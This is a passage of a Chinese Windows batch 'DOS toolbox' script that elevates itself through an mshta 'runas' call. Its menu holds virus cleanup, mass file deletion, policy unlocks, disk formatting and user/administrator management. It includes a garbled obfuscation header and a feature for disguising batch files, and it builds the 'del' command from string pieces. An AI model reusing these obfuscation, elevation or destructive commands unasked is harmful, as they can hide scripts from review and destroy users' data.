@goto chushihua
剪湫样剩氱呌晌劳倱儳湇歌愰椴代吹栲汴儰晃焊畒敍橊爰橒桤捎楌
汎煢慇佳猵湬搳汏物啵汏捎乡洱呮漹煍畤猳獨畏灦猷昹渶洳椷杪灭
兰捡儵漊敌桳朸搹照猱休捒儷瀰畃汬呏浢挶却丹搰挶攊椸桰爷煇搸
獆愲灇敉氰爷瑌杧樴挵慪剥猰慇桰敦敒晕吴朲剨爸潯啦湁汭呆略挶
佑焱攲瑔汰焱特栵版整剈獑椴挴晔浕漶欹攳氹煈扮渹晵橪潃畉剃浈
樰樹樴獯朵摨汵猷乇晡挰唱戸杨漳刴湔爲灈洊潑欸代副愱佪灣桴摓
桃灤桌焸爷椷瀱併佦摰扊灤慳浡制漰橓椱晅瑡楈戸吴丹卂儳杆匵樊
唷栶匴匶瑊挵住汯呱略牪朳愸瀴昱何瑒执啎爊昷獭汉浇卅估昷渳灆
剪湫样剩氱呌晌劳倱儳湇歌愰椴代吹栲汴儰晃焊畒敍橊爰橒桤捎楌
汎煢慇佳猵湬搳汏物啵汏捎乡洱呮漹煍畤猳獨畏灦猷昹渶洳椷杪灭
兰捡儵漊敌桳朸搹照猱休捒儷瀰畃汬呏浢挶却丹搰挶攊椸桰爷煇搸
獆愲灇敉氰爷瑌杧樴挵慪剥猰慇桰敦敒晕吴朲剨爸潯啦湁汭呆略挶
佑焱攲瑔汰焱特栵版整剈獑椴挴晔浕漶欹攳氹煈扮渹晵橪潃畉剃浈
樰樹樴獯朵摨汵猷乇晡挰唱戸杨漳刴湔爲灈洊潑欸代副愱佪灣桴摓
桃灤桌焸爷椷瀱併佦摰扊灤慳浡制漰橓椱晅瑡楈戸吴丹卂儳杆匵樊
唷栶匴匶瑊挵住汯呱略牪朳愸瀴昱何瑒执啎爊昷獭汉浇卅估昷渳灆
:chushihua
@echo off&cls&title 　&setlocal enabledelayedexpansion
setlocal
if /i "%1" equ "-ks" (goto ks)
if /i "%1" equ "-chrome" (goto chrome)
if /i "!systemdrive!" equ "x:" (goto ks)
fltmc 1>nul 2>nul
if "!errorlevel!" equ "0" (goto ks)
for /f "delims=" %%a in ("%0") do (set "weizhi=%%~fa")
if exist "!localappdata!\Microsoft\WindowsApps\wt.exe" (call :stwt) else (call :stcmd)
rem 在权限申请进程中预读命令提升后面初始化速度
if not exist "!temp!\dos_pre_reading_cache_os.tmp" (
	start /b wmic os get caption /value>"!temp!\dos_pre_reading_cache_os.tmp"
	start /b wmic PATH Win32_SystemEnclosure get ChassisTypes /value>"!temp!\dos_pre_reading_cache_wmictype.tmp"
	start /b reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v desktop>"!temp!\dos_pre_reading_cache_zmlj.tmp"
) else (
	type "!temp!\dos_pre_reading_cache_os.tmp">nul
	type "!temp!\dos_pre_reading_cache_wmictype.tmp">nul
	type "!temp!\dos_pre_reading_cache_zmlj.tmp">nul
)
exit 0
:stwt
start /min !comspec! /c mshta vbscript:createobject("shell.application").shellexecute("!localappdata!\Microsoft\WindowsApps\wt.exe","!weizhi!","-ks","runas",1)(window.close)
rem start /min !comspec! /c powershell -mta -nologo -noprofile start-process -filepath "wt" -argumentlist '"%0 -ks"' -verb runas>nul 2>nul
goto :eof
:stcmd
start /min !comspec! /c mshta vbscript:createobject("shell.application").shellexecute("!weizhi!","-ks","","runas",1)(window.close)
rem start /min !comspec! /c powershell -mta -nologo -noprofile start-process -filepath "!comspec!" -argumentlist '"/c %0 -ks"' -verb runas>nul 2>nul
goto :eof
:ks
(
set "dosqssj=!time!"
color f1
chcp 936>nul
set ver=20250101
set versize=175741
set fy1=___
set xz0=0
set "doh=--doh-url https://101.101.101.101/dns-query"
for /f "delims=" %%a in ("%0") do (set "weizhi=%%~fa")
set "ua=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
set "nx1=[+]下一页"
set "nx2=[-]上一页"
set hx=echo;_______________________________________________________________________________
if exist "!temp!\dos_pre_reading_cache_wmictype.tmp" (
	set "wmictype='type !temp!\dos_pre_reading_cache_wmictype.tmp'"
) else (
	set "wmictype='wmic PATH Win32_SystemEnclosure get ChassisTypes /value'"
)
for /f "tokens=2 delims=={}" %%a in (!wmictype!) do (
	if "%%a" equ "8" (
		set "nx1=[S]下一页"
		set "nx2=[A]上一页"
	) else (
		if "%%a" equ "9" (
			set "nx1=[S]下一页"
			set "nx2=[A]上一页"
		) else (
			if "%%a" equ "10" (
				set "nx1=[S]下一页"
				set "nx2=[A]上一页"
			)
		)
	)
)
set wmictype=
if exist "!temp!\dos_pre_reading_cache_zmlj.tmp" (
	set "zmlj=!temp!\dos_pre_reading_cache_zmlj.tmp"
) else (
	set "zmlj='"reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v desktop"'"
)
for /f "skip=2 tokens=3 delims= " %%a in (!zmlj!) do (
	set "zmlj=%%~fa"
	if not defined zmlj (set "zmlj=X:\Users\Default\Desktop")
)
for /f "tokens=3 delims=.]" %%a in ('ver') do (
	if %%a lss 10586 (set winv=1) else (set winv=0)
)
if exist "!temp!\dos_pre_reading_cache_os.tmp" (
	set "wmicos='type !temp!\dos_pre_reading_cache_os.tmp'"
) else (
	set "wmicos='wmic os get caption /value'"
	set cm=1
)
for /f "tokens=2 delims==" %%a in (!wmicos!) do (
	set "system=%%a"
	if "!cm!" equ "1" (
		set "system=!system:~0,-1!"
		set cm=
	)
	for /f "tokens=3" %%a in ("!system!") do (
		call :pd%%a 2>nul
	)
)
set wmicos=
if "!date:~11,1!" equ "周" (
	set "xingqi=!date:~11,2! "
) else (
	set "xingqi=!date:~11,3! "
)
for /f %%a in ('"echo;prompt $E^ |cmd"') do (
	set "cswz=%%a["
	set "cswz1=%%a"
)
if exist "!systemroot!\system32\choice.exe" (
	set "sel=call :choice"
) else (
	set "sel=call :set"
)
call :list
if /i "%2" neq "" (goto %2)
rem call :sjc !dosqssj! !time! jg
)
:memuv2
title DOS工具箱!system!
cls
set color=
set color1=f
set /a "color=!random!%%5"
if "!color!" equ "0" (
	set ysbak=40;97m
) else (
	if "!color!" equ "1" (
		set ysbak=44;97m
	) else (
		if "!color!" equ "2" (
		set color=5
		set ysbak=45;97m
		) else (
			if "!color!" equ "3" (
				set ysbak=46;97m
			) else (
				if "!color!" equ "4" (
					set color=7
					set color1=8
					set ysbak=47;90m
				)
			)
		)
	)
)
set "fy=!cswz!!ysbak:~0,3!91m_!cswz!!ysbak!!cswz!!ysbak:~0,3!92m_!cswz!!ysbak!!cswz!!ysbak:~0,3!93m_!cswz!!ysbak!"
color !color!!color1!
if !start! lss 1 (set start=1)
if not defined a!start! (
	set /a "start=maxa-maxa/9*9"
	if "!start!" equ "0" (
		set /a "start=maxa-8"
	) else (
		set /a "start=maxa/9*9+1"
	)
)
set /a "memuys=start/9+1"
set /a "end=start+8"
set /a "pd=end+1"
set /a "pd1=start-1"
rem echo;初始化用时: !jg!
if "!winv!" equ "0" (
	echo;                                    菜单 - 第!cswz!!ysbak:~0,3!92m!memuys!!cswz!!ysbak!页
) else (
	echo;　　　　　　　　　　　　　　　　　　菜单 - 第!memuys!页
)
echo;现在是!date:~0,4!年!date:~5,2!月!date:~8,2!日 !xingqi!!time:~0,8!
call :csfgf
set xx=0
for /l %%a in (!start!,1,!end!) do (
	if defined a%%a (
		set /a "xx+=1"
		set "xz!xx!=%%a"
		echo;[!xx!]!a%%a!
	)
)
if not defined a!pd! (
    if "!winv!" equ "0" (
        echo;[0]退出                                             !cswz!42;97m!nx2!!cswz!!ysbak!
    ) else (
        echo;[0]退出                                             !nx2!
    )
) else (
    if !pd1! lss 1 (
        if "!winv!" equ "0" (
            echo;[0]退出                                                         !cswz!42;97m!nx1!!cswz!!ysbak!
        ) else (
            echo;[0]退出                                             !nx1!
        )
    ) else (
        if "!winv!" equ "0" (
            echo;[0]退出                                             !cswz!42;97m!nx1!   !nx2!!cswz!!ysbak!
        ) else (
            echo;[0]退出                                             !nx1!　　　!nx2!
        )
    )
)
call :csfgf
set caidan=
set /p "caidan=请输入你的选择:"
call :strlen caidan jg
if "!jg!" equ "1" (
	call :checkvar caidan num jg
	if "!jg!" equ "1" (goto !xz%caidan%!)
)
if "!caidan!" equ "-" (
	set /a "pd=start-1"
	if !pd! geq 1 (
		set /a "start-=9"
		goto memuv2
	) else (
		goto memuv2.1
	)
)
if "!caidan!" equ "+" (
	set /a "pd=end+1"
	if defined a!pd! (
		set /a "start+=9"
		goto memuv2
	) else (
		goto memuv2.1
	)
)
if /i "!caidan!" equ "a" (
	set /a "pd=start-1"
	if !pd! geq 1 (
		set /a "start-=9"
		goto memuv2
	) else (
		goto memuv2.1
	)
)
if /i "!caidan!" equ "s" (
	set /a "pd=end+1"
	if defined a!pd! (
		set /a "start+=9"
		goto memuv2
	) else (
		goto memuv2.1
	)
)
if /i "!caidan:~0,2!" equ "go" (
	set "caidan=!caidan:~2!"
	call :checkvar caidan num jg
	if "!jg!" equ "1" (
		set /a "start=caidan*9-8"
		goto memuv2
	) else (
		goto memuv2.1
	)
)
if /i "!caidan!" equ "gx" (
	set "verbak=!ver!"
	goto update
)
if /i "!caidan!" equ "qzgx" (
	set verbak=0
	goto update
)
if /i "!caidan!" equ "js" (goto 49)
if /i "!caidan!" equ "kcd" (goto kcd)
if /i "!caidan!" equ "gcd" (goto gcd)
if /i "!caidan!" equ "guanji" (goto guanji)
if /i "!caidan!" equ "guanyu" (goto guanyu)
if /i "!caidan!" equ "csh" (endlocal&goto chushihua)
:memuv2.1
set /p =请输入正确的选项！<nul
call :out 2
goto memuv2
:csfgf
if "!winv!" equ "0" (
	if "!fyacs!" equ "" (
    	set fya=
    	for /l %%a in (1,1,26) do (
    	    set "fya=!fya!!fy!"
    	)
		echo;!fya!
		set /a "fyacs+=1"
	) else (
    	echo;!fya!
    	set fyacs=
	)
) else (
	!hx!
)
goto :eof
:0
exit 0
:1
setlocal
title 清除U盘里的lpk.dll病毒!system!
cls
echo;按任意键开始清除lpl.dll病毒&pause>nul
cls
echo;正在搜索可移动磁盘...
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%a in (!sypf!) do (
	fsutil fsinfo drivetype %%a|find /i "可移动驱动器"&&(
		for /f "delims=" %%b in ('"dir /a /s /b %%alpk.dll"') do (
			if "%%~zb" equ "44032" (
				attrib -s -h -r "%%b"
				del /f /q "%%b"
				echo;已删除%%b
			)
		)
	)
)
!hx!
echo;清除完成
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:2
setlocal
title 清除U盘里的jwgkvsq.vmx病毒，并免疫该病毒!system!
cls
echo;按任意键开始清除jwgkvsq.vmx病毒&pause>nul
cls
echo;正在搜索可移动磁盘...
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%j in (!sypf!) do (
	fsutil fsinfo drivetype %%j|find /i "可移动驱动器"&&goto 2-1
)
cls
echo;没有找到可移动磁盘
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:2-1
cls
echo;正在清除jwgkvsq.vmx病毒...
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%j in (!sypf!) do (
	fsutil fsinfo drivetype %%j|find /i "可移动驱动器"&&(
		takeown/f "%%jautorun.inf"
		echo;y|cacls "%%jautorun.inf" /t /c /p everyone:f
		takeown/f "%%jRECYLER"
		echo;y|cacls "%%jRECYCLER" /t /c /p everyone:f
		attrib -s -h -r "%%jautorun.inf"
		del /f /q "%%jautorun.inf"
		rd /s /q "%%jRECYCLER"
		del /f /q "%%jRECYCLER"
		echo;jwgkvsq.vmx病毒免疫文件，请勿删除！>"%%jRECYCLER"
	)
)
!hx!
echo;清除完成
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:3
setlocal
title 清理系统垃圾!system!
cls
set sc=delasd123
set scw=rdasd123
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.tm%ad%p;^
						%systemdrive%\*log.txt;^
						%systemdrive%\*.dmp;^
						%systemdrive%\*.log;^
						%systemdrive%\*.gid;^
						%systemdrive%\*.chk;^
						%systemdrive%\*.old;^
						%systemdrive%\recycled\*.*;^
						%windir%\*.bak;^
						%windir%\prefetch\*.*;^
						%userprofile%\cookies\*.*;^
						"%userprofile%\Local Settings\Temporary Internet Files\*.*";^
						"%userprofile%\Local Settings\Temp\*.*";^
						"%userprofile%\recent\*.*";^
						%systemdrive%\*._mp;^
						%systemdrive%\~*.*
%scw:~0,2%/s/q %windir%\temp
md %windir%\temp
goto 3.1
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.syd;^
						%systemdrive%\*.spc;^
						%systemdrive%\*.cdr_;^
						%systemdrive%\*.#res;^
						%systemdrive%\*.---;^
						%systemdrive%\*.$$$^
						%systemdrive%\*.@@@;^
						%systemdrive%\*.??$;^
						%systemdrive%\*.??~;^
						%systemdrive%\*.~*;^
						%systemdrive%\mscreate.dir;^
						%systemdrive%\chklist.*;^
						%systemdrive%\*.ftg;^
						%systemdrive%\*.fts;^
						%systemdrive%\*.err;^
						%systemdrive%\*.prv;^
						%systemdrive%\*.ms;^
						%systemdrive%\*.wbk;^
						%systemdrive%\*.xlk^
						%systemdrive%\*.diz
:3.1
!hx!
echo;清理完成
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:4
title 显示系统信息!system!
cls
systeminfo
mode
!hx!
set /p =按任意键返回菜单<nul&pause>nul
goto memuv2
:5
title 解除任务管理器被禁用!system!
cls
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t reg_dword /d 00000000 /f
!hx!
set /p =按任意键返回菜单<nul&pause>nul
goto memuv2
:6
title 显示被隐藏文件(中了该类病毒后)!system!
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t reg_dword /d 00000001 /f
!hx!
set /p =按任意键返回菜单<nul&pause>nul
goto memuv2
:7
title 解除注册表被禁用!system!
cls
echo;[Version]>%systemdrive%\windows\temp\reg.inf
echo;Signature="$CHICAGO$">>%systemdrive%\windows\temp\reg.inf
echo;[DefaultInstall]>>%systemdrive%\windows\temp\reg.inf
echo;DelReg=del>>%systemdrive%\windows\temp\reg.inf
echo;[del]>>%systemdrive%\windows\temp\reg.inf
echo;HKCU,Software\Microsoft\Windows\CurrentVersion\Policies\System,Disableregistrytools>>%systemdrive%\windows\temp\reg.inf
rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 %systemdrive%\windows\temp\reg.inf
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000000 /f
del /f /q %systemdrive%\windows\temp\reg.inf
!hx!
set /p =按任意键返回菜单<nul&pause>nul
goto memuv2
:8
setlocal
title 计算开平方!system!
cls
set /p "s=请输入被开平方的数: "
call :checkvar s num jg
if "!jg!" equ "0" (
	echo;无效输入
	call :out 2
	endlocal
	goto 8
)
set /p "w=精确到小数点后几位数: "
call :checkvar w num jg
if "!jg!" equ "0" (
	echo;无效输入
	call :out 2
	endlocal
	goto 8
)
call :sqrt !s! !w! jg
cls
echo;!s!的开平方结果是(精确到小数点后!w!位): !jg!
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:9
setlocal
title 命令提示符!system!
for /f "delims=" %%a in ('hostname') do (set "hostname=%%a")
cls
ver
if !winv! equ 0 (
	cmd /k prompt !cswz!!ysbak:~0,3!92m%username%!cswz!!ysbak!@%hostname%:$p#$s
) else (
	cmd /k prompt %username%@%hostname%:$p#$s
)
endlocal
goto memuv2
:10
setlocal
title 将磁盘格式转换为NTFS!system!
cls
!hx!
fsutil fsinfo drives
!hx!
echo;如果不能正常转换，请使用磁盘错误修复
set zhuanhuancipan=
set /p "zhuanhuancipan=请输入需要转换的盘符: "
cls
convert !zhuanhuancipan!:/fs:ntfs
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:11
setlocal
title 磁盘修复!system!
cls
!hx!
fsutil fsinfo drives
!hx!
set cipanxioufu=
set /p "cipanxioufu=请输入需要修复的盘符: "
cls
fsutil fsinfo ntfsinfo !cipanxioufu!:>nul 2>nul
if "!errorlevel!" equ "0" (
	chkdsk /x /f /sdcleanup !cipanxioufu!:
) else (
	chkdsk /f /x !cipanxioufu!:
)
!hx!
echo;修复完成
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:12
setlocal
color cf
title 格式化!system!
echo;
cls
set geshihuaxuanxiang=
set /p "geshihuaxuanxiang=格式化有一定的危险性，是否继续(y/n): "
if /i "!geshihuaxuanxiang!" equ "y" (goto 12.1)
if /i "!geshihuaxuanxiang!" equ "n" (endlocal&goto memuv2)
echo;请输入正确的选项！
call :out 2
endlocal
goto 12
:12.1
cls
!hx!
fsutil fsinfo drives
!hx!
set geshihua=
set /p "geshihua=请输入需要格式化的盘符: "
cls
label !geshihua!: format
format !geshihua!:/x/q/v:format/y
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:76
setlocal
color 0a
title bat加密!system!
cls
echo;此工具只可以用于纯文本文件加密
!hx!
echo;[1]bat文件加密(方法1)
echo;[2]bat文件解密
echo;[3]bat文件加密(方法2)(推荐使用)
echo;[0]返回菜单
!hx!
set cho=1230
set shuru=
!sel!
if "!shuru!" equ "1" (goto 76.1)
if "!shuru!" equ "2" (goto 76.2)
if "!shuru!" equ "3" (goto 76.3)
if "!shuru!" equ "4" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
echo;请输入正确的选项！
call :out 2
endlocal
goto 76
:76.1
title bat文件加密(方法1)!system!
cls
set jiami=
set /p "jiami=拖动需要加密的文件到此窗口(e=返回): "
if /i "!jiami!" equ "e" (
	endlocal
	goto 76
)
call :ljjc jiami
if "!errorlevel!" equ "0" (
	echo;无效路径
	call :out 2
	goto 76.1
)
cls
for /f "delims=" %%b in ("!jiami!") do (
	set /a "batpdjg=%%~zb%%2"
	if "!batpdjg!" equ "1" (
		set "batpdjg= "
	) else (
		set "batpdjg="
	)
	(
		echo;%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a!batpdjg!
		echo;cls
	)>"%temp%\1.tmp"
	copy /b /y "%temp%\1.tmp"+"%%b" "%%~dpb加密_%%~nb%%~xb">nul
	del /f /q "%temp%\1.tmp"
)
cls
echo;加密完成
call :out 2
endlocal
goto 76
:76.2
title bat文件解密!system!
cls
set jiemi=
set /p "jiemi=拖动需要解密的文件到此窗口(e=返回): "
if /i "!jiemi!" equ "e" (
	endlocal
	goto 76
)
call :ljjc jiemi
if "!errorlevel!" equ "0" (
	echo;无效路径
	call :out 2
	goto 76.2
) 
cls
for /f "delims=" %%a in ("!jiemi!") do (
	echo;>"%temp%\1.tmp"
	copy /b /y "%temp%\1.tmp"+"%%a" "%%~dpa解密_%%~na%%~xa">nul
	del /f /q "%temp%\1.tmp"
)
cls
echo;解密完成
call :out 2
endlocal
goto 76
:76.3
cls
title bat文件加密(方法2)!system!
set jiami=
set /p "jiami=拖动需要加密的文件到此窗口(e=返回): "
if /i "!jiami!" equ "e" (
	endlocal
	goto 76
)
call :ljjc jiami
if "!errorlevel!" equ "0" (
	echo;无效路径
	call :out 2
	goto 76.3
)
cls
for /f "delims=" %%a in ("!jiami!") do (
	set /p =//4NCg==<nul>"%temp%\1.tmp"
	certutil -decode -f "%temp%\1.tmp" "%temp%\2.tmp">nul
	copy /b /y "%temp%\2.tmp"+"%%a" "%%~dpa加密_%%~na%%~xa">nul
	del /f /q "%temp%\1.tmp";"%temp%\2.tmp"
)
cls
echo;加密完成
call :out 2
endlocal
goto 76
:13
setlocal
title DOS计算器!system!
cls
!hx!
echo;注意:DOS计算只能进行整数运算，计算结果只能精确到整数
echo;有效数值范围(-2147483648至2147483647)(c=清屏 e=返回)
!hx!
:13.1
set biaodashi=
set /p "biaodashi=请输入表达式: "
if /i "!biaodashi!" equ "c" (endlocal&goto 13)
if /i "!biaodashi!" equ "e" (endlocal&goto memuv2)
set /a "jieguo=!biaodashi!"
echo;计算结果:!biaodashi!=!jieguo!
!hx!
goto 13.1
:14
title 解除命令提示符被禁用!system!
cls
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t reg_dword /d 00000000 /f
!hx!
set /p =按任意键返回菜单<nul&pause>nul
goto memuv2
:15
setlocal
title 随机数生成器!system!
set cs=0
cls
echo;说明:只能输入整数，随机数范围(0-32767)(e=返回菜单)
!hx!
set zuidazhi=
set zuixiaozhi=
set /p "zuidazhi=请输入随机数的最大值: "
set /p "zuixiaozhi=请输入随机数的最小值: "
!hx!
:15.1
set /a "cs+=1"
set /a "zdzcl=zuidazhi+1"
set /a "suijishu=!random!%%(zdzcl-zuixiaozhi)+zuixiaozhi"
echo;第!cs!次产生的随机数: !suijishu!
set tuichusuijishu=
set /p tuichusuijishu=
if /i "!tuichusuijishu!" equ "e" (endlocal&goto memuv2)
goto 15.1
:16
setlocal
title 清除KHATRA病毒!system!
cls
echo;按任意键开始清除KHATRT病毒&pause>nul
cls
echo;正在结束KHATRA病毒进程...
call :out 2
:16(4)
set khatra=0
:16.4.1
taskkill /f /im xplorer.exe
attrib -s -h -r "%systemdrive%\windows\xplorer.exe"
del /f /q "%systemdrive%\windows\xplorer.exe"
md "%systemdrive%\windows\xplorer.exe"
taskkill /f /im ghost.exe
attrib -s -h -r "%systemdrive%\windows\system\ghost.exe"
del /f /q "%systemdrive%\windows\system\ghost.exe"
md "%systemdrive%\windows\system\ghost.exe"
taskkill /f /im khatra.exe
attrib -s -h -r "%systemdrive%\windows\system32\khatra.exe"
del /f /q "%systemdrive%\windows\system32\khatra.exe"
md "%systemdrive%\windows\system32\khatra.exe"
attrib -s -h -r "%systemdrive%\khatra.exe"
del /f /q "%systemdrive%\khatra.exe"
md "%systemdrive%\khatra.exe"
if not "!khatra!" equ "1" (
	set /a "khatra+=1"
	goto 16.4.1
)
!hx!
echo;正在删除KHATRA病毒...
!hx!
call :out 2
rd /s /q "%systemdrive%\khatra.exe";^
		"%systemdrive%\windows\xplorer.exe";^
		"%systemdrive%\windows\system\ghost.exe";^
		"%systemdrive%\windows\system32\khatra.exe";^
		"%systemdrive%\windows\k.backup";^
		"%systemdrive%\windows\system32\ntmsdata"
del /f /q "%systemdrive%\windows\youtube.cab";^
		"%systemdrive%\windows\supermodels.cab";^
		"%systemdrive%\windows\new-screamsaver.com.cab";^
		"%systemdrive%\windows\New WinZip File.cab";^
		"%systemdrive%\windows\New WinRAR ZIP archive.cab";^
		"%systemdrive%\windows\New WinRAR archive.cab";^
		"%systemdrive%\windows\mario675.cab";^
		"%systemdrive%\windows\kavSetupEng3857.cab";^
		"%systemdrive%\windows\fh_antivirussetup6534.cab";^
		"%systemdrive%\windows\CyberWar.cab";^
		"%systemdrive%\windows\khatarnakh.exe";^
		"%systemdrive%\windows\tasks\at1.job";^
		"%systemdrive%\windows\system32\avphost.dll";^
		"%systemdrive%\windows\inf\autoplay.inf"^
!hx!
echo;正在全盘扫描...
!hx!
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for /f "delims=" %%a in ('"for %%b in (!sypf!) do (dir /a /s /b %%b*.exe)"') do (
	if "%%~za" equ "486912" (
		attrib -s -h -r "%%a"
		del /f /q "%%a"
		echo;已删除%%a
	)
)
for /f "delims=" %%c in ('"for %%d in (!sypf!) do (dir /a /s /b %%dautorun.inf)"') do (
	if "%%~zc" equ "234" (
		attrib -s -h -r "%%c"
		del /f /q "%%c"
		echo;已删除%%c
	)
)
for %%k in (!sypf!) do (del /f /s /q %%k(Empty).lnk)
echo;[Version]>%systemdrive%\windows\temp\reg.inf
echo;Signature="$CHICAGO$">>%systemdrive%\windows\temp\reg.inf
echo;[DefaultInstall]>>%systemdrive%\windows\temp\reg.inf
echo;DelReg=del>>%systemdrive%\windows\temp\reg.inf
echo;[del]>>%systemdrive%\windows\temp\reg.inf
echo;HKCU,Software\Microsoft\Windows\CurrentVersion\Policies\System,Disableregistrytools>>%systemdrive%\windows\temp\reg.inf
rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 %systemdrive%\windows\temp\reg.inf
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t reg_dword /d 00000001 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000000 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer" /v nosetfolders /t reg_dword /d 00000000 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t reg_dword /d 00000000 /f
del /f /q %systemdrive%\windows\temp\reg.inf
if /i "!sypf!" equ "c:\" (goto shoudong)
if /i "!sypf!" equ "c:\ " (goto shoudong)
call :out 2
:16(1)
!hx!
set zhucebiaoqingli=
set /p "zhucebiaoqingli=注册表需要手动清理.是否打开注册表(y/n):"
if /i "!zhucebiaoqingli!" equ "y" (goto 16.2)
if /i "!zhucebiaoqingli!" equ "n" (goto 16.3)
echo;请输入正确的选项！
call :out 2
goto 16(1)
:16.2
cls
regedit
:16.3
cls
echo;KHATRA病毒清除完成
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:shoudong
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for /f "delims=" %%a in ('"for %%b in (!sypf!) do (dir /a /s /b %%b*.exe)"') do (
	if "%%~za" equ "486912" (
		attrib -s -h -r "%%a"
		del /f /q "%%a"
		echo;已删除%%a
	)
)
for /f "delims=" %%c in ('"for %%d in (!sypf!) do (dir /a /s /b %%dautorun.inf)"') do (
	if "%%~zc" equ "234" (
		attrib -s -h -r "%%c"
		del /f /q "%%c"
		echo;已删除%%c
	)
)
goto 16(1)
:17
cls
start regedit
goto memuv2
:18
cls
start control
goto memuv2
:19
cls
start dxdiag
goto memuv2
:20
cls
start compmgmt.msc
goto memuv2
:21
setlocal
title 用户管理!system!
set "cho=123456780"
cls
!hx!
echo;[1]显示所有的用户
echo;[2]创建新用户
echo;[3]删除用户
echo;[4]提升用户为管理员
echo;[5]强制修改用户密码
echo;[6]查看用户信息
echo;[7]激活账户
echo;[8]停用账户
echo;[0]返回菜单
!hx!
!sel!
if "!shuru!" equ "1" (goto 21.1)
if "!shuru!" equ "2" (goto 21.2)
if "!shuru!" equ "3" (goto 21.3)
if "!shuru!" equ "4" (goto 21.4)
if "!shuru!" equ "5" (goto 21.5)
if "!shuru!" equ "6" (goto 21.6)
if "!shuru!" equ "7" (goto 21.7)
if "!shuru!" equ "8" (goto 21.8)
if "!shuru!" equ "9" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =请输入正确的选项！<nul
call :out 2
endlocal
goto 21
:21.1
title 显示所有的用户!system!
cls
!hx!
net user
!hx!
echo;当前已登录的用户:!username!
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 21
:21.2
title 创建新用户!system!
cls
echo;注意:创建的用户类型为普通用户
!hx!
net user
!hx!
echo;当前已登录的用户:!username!
!hx!
set xinyonghuming=
set xinyonghumima=
set /p "xinyonghuming=用户名: "
set /p "xinyonghumima=密码: "
!hx!
cls
net user !xinyonghuming! !xinyonghumima! /add
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 21
:21.3
title 删除用户!system!
cls
!hx!
net user
!hx!
echo;当前已登录的用户:!username!
!hx!
set shanchuyonghu=
set /p "shanchuyonghu=请输入要删除的用户: "
cls
net user !shanchuyonghu! /del
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 21
:21.4
title 提升用户为管理员!system!
cls
!hx!
net user
!hx!
